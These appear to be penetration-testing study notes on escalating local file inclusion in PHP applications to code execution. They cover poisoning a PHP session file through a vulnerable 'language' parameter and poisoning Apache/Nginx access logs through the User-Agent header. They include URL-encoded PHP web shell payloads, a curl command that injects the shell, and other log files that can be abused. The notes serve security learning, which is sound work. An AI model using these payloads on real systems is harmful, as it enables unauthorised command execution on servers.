- php session log poisoning via vulnerable parameter
- nginx/apache log poison via agent header
## PHP Session Poisoning via local file inclusion
nignx and apache store log files, if we can abuse the lfi to read these log files, we can poison user agent header with webshell and then access the webshell by browsing to the log file location.
Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix. For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
obtain the session name 
![](Pasted%20image%2020250503005339.png)
As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
### writing webshell to Session log file
#### Experimenting with the vulnerable 
try random value for the vulnerable parameter
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

checking if it was ever reflected to the log file by browsing to our session log file `sess_<cookie_value>`

```

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

![](Pasted%20image%2020250503005429.png)
This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
#### including a webshell to request
we can write a basic php shell and pass  it to the vulnerable parameter `language`
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
now supposedly the session cookie should hold that webshell, lets try to access where the session is stored on the server by LFI vulnerability
#### confirming webshell
```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
![](Pasted%20image%2020250503005900.png)
## Web Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header.
Once poisoned, we need to include the logs through the LFI vulnerability,and for that we need to have read-access over the logs.
![[Pasted image 20251009165414.png]]
`Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups). However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users.

read apache logs
`?language=/var/log/apache2/access.log`
read nginx logs
``  ?language=/var/log/nginx/access.log 
poison  logs for NGINX and Apache with curl
```shell
# prepare webshell code
echo -n "User-Agent: <?php system($_GET['cmd']); ?>" > Poison
# send req
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
![](Pasted%20image%2020250503010512.png)
![](Pasted%20image%2020250503010655.png)
**:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.